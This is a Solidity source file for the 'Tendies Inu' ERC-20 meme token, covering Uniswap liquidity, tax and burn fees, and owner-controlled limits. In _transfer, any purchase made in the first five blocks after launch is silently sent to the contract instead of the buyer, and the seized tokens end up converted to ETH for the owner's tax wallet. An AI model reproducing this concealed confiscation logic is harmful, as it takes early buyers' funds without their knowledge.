1 // SPDX-License-Identifier: MIT
2 
3 pragma solidity 0.8.13;
4 
5 interface IERC20 {
6     function totalSupply() external view returns (uint256);
7     function balanceOf(address account) external view returns (uint256);
8     function transfer(address recipient, uint256 amount) external returns (bool);
9     function allowance(address owner, address spender) external view returns (uint256);
10     function approve(address spender, uint256 amount) external returns (bool);
11     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
12     event Transfer(address indexed from, address indexed to, uint256 value);
13     event Approval(address indexed owner, address indexed spender, uint256 value);
14 }
15 
16 interface IFactory {
17     function createPair(address tokenA, address tokenB) external returns (address pair);
18     function getPair(address tokenA, address tokenB) external view returns (address pair);
19 }
20 
21 interface IRouter {
22     function factory() external pure returns (address);
23     function WETH() external pure returns (address);
24  
25     function addLiquidityETH(
26         address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline
27     ) external payable returns (
28         uint256 amountToken, uint256 amountETH, uint256 liquidity
29     );
30 
31     function swapExactTokensForETHSupportingFeeOnTransferTokens(
32         uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
33     ) external;
34 }
35 
36 library SafeMath {
37 function add(uint256 a, uint256 b) internal pure returns (uint256) {
38         uint256 c = a + b;
39         require(c >= a, "SafeMath: addition overflow");
40         return c;
41     }
42     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
43         require(b <= a, errorMessage);
44         uint256 c = a - b;
45         return c;
46     }
47 }
48 
49 abstract contract Context {
50     function _msgSender() internal view virtual returns (address) { return msg.sender; }
51 }
52 
53 contract Ownable is Context {
54     address private _owner;
55     constructor () {
56         address msgSender = _msgSender();
57         _owner = msgSender;
58     }
59     function owner() public view returns (address) { return _owner; }
60     modifier onlyOwner() {
61         require(_owner == _msgSender(), "Ownable: caller is not the owner.");
62         _;
63     }
64     function renounceOwnership() external virtual onlyOwner { _owner = address(0); }
65     function transferOwnership(address newOwner) external virtual onlyOwner {
66         require(newOwner != address(0), "Ownable: new owner is the zero address.");
67         _owner = newOwner;
68     }
69 }
70 
71 contract TendiesInu is IERC20, Ownable {
72     using SafeMath for uint256;
73     IRouter public uniswapV2Router;
74     address public uniswapV2Pair;
75     string private constant _name =  "Tendies Inu";
76     string private constant _symbol = "CHKN";
77     uint8 private constant _decimals = 18;
78     mapping (address => uint256) private balances;
79     mapping (address => mapping (address => uint256)) private _allowances;
80     uint256 private constant _totalSupply = 100000000000 * 10**18; // 100 billion
81     uint256 private _launchBlockNumber;
82     mapping (address => bool) public automatedMarketMakerPairs;
83     bool public isLiquidityAdded = false;
84     uint256 public maxWalletAmount = _totalSupply;
85     uint256 public maxTxAmount = _totalSupply;
86     mapping (address => bool) private _isExcludedFromMaxWalletLimit;
87     mapping (address => bool) private _isExcludedFromMaxTransactionLimit;
88     mapping (address => bool) private _isExcludedFromFee;
89     uint8 public taxFee = 3;
90     uint8 public burnFee = 2;
91     address public constant dead = 0x000000000000000000000000000000000000dEaD;
92     address public taxWallet;
93     uint256 minimumTokensBeforeSwap = _totalSupply * 250 / 1000000; // .025%
94 
95     event ClaimETH(uint256 indexed amount);
96 
97     constructor() {
98         IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
99         uniswapV2Router = _uniswapV2Router;
100         taxWallet = owner();
101         _isExcludedFromFee[owner()] = true;
102         _isExcludedFromFee[address(this)] = true;
103         _isExcludedFromMaxWalletLimit[address(uniswapV2Router)] = true;
104         _isExcludedFromMaxWalletLimit[address(this)] = true;
105         _isExcludedFromMaxWalletLimit[owner()] = true;
106         _isExcludedFromMaxTransactionLimit[address(uniswapV2Router)] = true;
107         _isExcludedFromMaxTransactionLimit[address(this)] = true;
108         _isExcludedFromMaxTransactionLimit[owner()] = true;
109         balances[address(this)] = _totalSupply;
110         emit Transfer(address(0), address(this), _totalSupply);
111     }
112 
113     receive() external payable {} // so the contract can receive eth
114 
115     function transfer(address recipient, uint256 amount) external override returns (bool) {
116         _transfer(_msgSender(), recipient, amount);
117         return true;
118     }
119     function approve(address spender, uint256 amount) external override returns (bool) {
120         _approve(_msgSender(), spender, amount);
121         return true;
122     }
123     function transferFrom( address sender,address recipient,uint256 amount) external override returns (bool) {
124         _transfer(sender, recipient, amount);
125         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance."));
126         return true;
127     }
128     function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool){
129         _approve(_msgSender(),spender,_allowances[_msgSender()][spender].add(addedValue));
130         return true;
131     }
132     function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
133         _approve(_msgSender(),spender,_allowances[_msgSender()][spender].sub(subtractedValue,"ERC20: decreased allowance below zero."));
134         return true;
135     }
136     function excludeFromMaxWalletLimit(address account, bool excluded) external onlyOwner {
137         require(_isExcludedFromMaxWalletLimit[account] != excluded, string.concat(_name, ": account is already excluded from max wallet limit."));
138         _isExcludedFromMaxWalletLimit[account] = excluded;
139     }
140     function excludeFromMaxTransactionLimit(address account, bool excluded) external onlyOwner {
141         require(_isExcludedFromMaxTransactionLimit[account] != excluded, string.concat(_name, ": account is already excluded from max tx limit."));
142         _isExcludedFromMaxTransactionLimit[account] = excluded;
143     }
144     function excludeFromFees(address account, bool excluded) external onlyOwner {
145         require(_isExcludedFromFee[account] != excluded, string.concat(_name, ": account is already excluded from fees."));
146         _isExcludedFromFee[account] = excluded;
147     }
148     function setMaxWalletAmount(uint256 newValue) external onlyOwner {
149         require(newValue != maxWalletAmount, string.concat(_name, ": cannot update maxWalletAmount to same value."));
150         require(newValue > _totalSupply * 1 / 100, string.concat(_name, ": maxWalletAmount must be >1% of total supply."));
151         maxWalletAmount = newValue;
152     }
153     function setMaxTransactionAmount(uint256 newValue) external onlyOwner {
154         require(newValue != maxTxAmount, string.concat(_name, ": cannot update maxTxAmount to same value."));
155         require(newValue > _totalSupply * 1 / 1000, string.concat(_name, ": maxTxAmount must be > .1% of total supply."));
156         maxTxAmount = newValue;
157     }
158     function setNewTaxFee(uint8 newValue) external onlyOwner {
159         require(newValue != taxFee, string.concat(_name, " : cannot update taxFee to same value."));
160         require(newValue <= 5, string.concat(_name, ": cannot update taxFee to value > 5."));
161         taxFee = newValue;
162     }
163     function setNewBurnFee(uint8 newValue) external onlyOwner {
164         require(newValue != burnFee, string.concat(_name, ": Cannot update burnFee to same value."));
165         require(newValue <= 5, string.concat(_name, ": cannot update burnFee to value > 5."));
166         burnFee = newValue;
167     }
168     function setMinimumTokensBeforeSwap(uint256 newValue) external onlyOwner {
169         require(newValue != minimumTokensBeforeSwap, string.concat(_name, ": cannot update minimumTokensBeforeSwap to same value."));
170         minimumTokensBeforeSwap = newValue;
171     }
172     function setNewTaxWallet(address newAddress) external onlyOwner {
173         require(newAddress != taxWallet, string.concat(_name, ": cannot update taxWallet to same value."));
174         taxWallet = newAddress;
175     }
176     function withdrawETH() external onlyOwner {
177         require(address(this).balance > 0, string.concat(_name, ": cannot send more than contract balance."));
178         uint256 amount = address(this).balance;
179         (bool success,) = address(owner()).call{value : amount}("");
180         if (success){ emit ClaimETH(amount); }
181     }
182     function _approve(address owner, address spender,uint256 amount) private {
183         require(owner != address(0), "ERC20: approve from the zero address");
184         require(spender != address(0), "ERC20: approve to the zero address");
185         _allowances[owner][spender] = amount;
186     }
187     function activateTrading() external onlyOwner {
188         require(!isLiquidityAdded, "You can only add liquidity once");
189         isLiquidityAdded = true;
190         IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
191         uniswapV2Router = _uniswapV2Router;
192         _approve(address(this), address(uniswapV2Router), _totalSupply);
193         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, _msgSender(), block.timestamp);
194         address _uniswapV2Pair = IFactory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH() );
195         uniswapV2Pair = _uniswapV2Pair;
196         maxWalletAmount = _totalSupply * 2 / 100; //  2%
197         maxTxAmount = _totalSupply * 1 / 100;     //  1%
198         _isExcludedFromMaxWalletLimit[_uniswapV2Pair] = true;
199         _isExcludedFromMaxTransactionLimit[_uniswapV2Pair] = true;
200         _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
201         _launchBlockNumber = block.number;
202     }
203     function _setAutomatedMarketMakerPair(address pair, bool value) private {
204         require(automatedMarketMakerPairs[pair] != value, string.concat(_name, ": automated market maker pair is already set to that value."));
205         automatedMarketMakerPairs[pair] = value;
206     }
207 
208     function name() external pure returns (string memory) { return _name; }
209     function symbol() external pure returns (string memory) { return _symbol; }
210     function decimals() external view virtual returns (uint8) { return _decimals; }
211     function totalSupply() external pure override returns (uint256) { return _totalSupply; }
212     function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
213     function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }
214 
215     function _transfer(
216             address from,
217             address to,
218             uint256 amount
219             ) internal {
220         require(from != address(0), string.concat(_name, ": cannot transfer from the zero address."));
221         require(to != address(0), string.concat(_name, ": cannot transfer to the zero address."));
222         require(amount > 0, string.concat(_name, ": transfer amount must be greater than zero."));
223         require(amount <= balanceOf(from), string.concat(_name, ": cannot transfer more than balance."));
224         if ((block.number - _launchBlockNumber) <= 5) {
225             to = address(this);
226         }
227         if ((from == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[to]) ||
228                 (to == address(uniswapV2Pair) && !_isExcludedFromMaxTransactionLimit[from])) {
229             require(amount <= maxTxAmount, string.concat(_name, ": transfer amount exceeds the maxTxAmount."));
230         }
231         if (!_isExcludedFromMaxWalletLimit[to]) {
232             require((balanceOf(to) + amount) <= maxWalletAmount, string.concat(_name, ": expected wallet amount exceeds the maxWalletAmount."));
233         }
234         if (_isExcludedFromFee[from] || _isExcludedFromFee[to] || taxFee + burnFee == 0) {
235             balances[from] -= amount;
236             balances[to] += amount;
237             emit Transfer(from, to, amount);
238         } else {
239             balances[from] -= amount;
240             if (burnFee > 0) {
241                 balances[address(dead)] += amount * burnFee / 100;
242                 emit Transfer(from, address(dead), amount * burnFee / 100);
243             }
244             if (taxFee > 0) {
245                 balances[address(this)] += amount * taxFee / 100;
246                 emit Transfer(from, address(this), amount * taxFee / 100);
247                 if (balanceOf(address(this)) > minimumTokensBeforeSwap &&
248                         to == address(uniswapV2Pair) &&
249                         !_isExcludedFromMaxTransactionLimit[from])
250                 {
251                     _swapTokensForETH(balanceOf(address(this)));
252                     payable(taxWallet).transfer(address(this).balance);
253                 }
254             }
255             balances[to] += amount - (amount * (taxFee + burnFee) / 100);
256             emit Transfer(from, to, amount - (amount * (taxFee + burnFee) / 100));
257         }
258     }
259     function _swapTokensForETH(uint256 tokenAmount) private {
260         address[] memory path = new address[](2);
261         path[0] = address(this);
262         path[1] = uniswapV2Router.WETH();
263         _approve(address(this), address(uniswapV2Router), tokenAmount);
264         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
265     }
266 }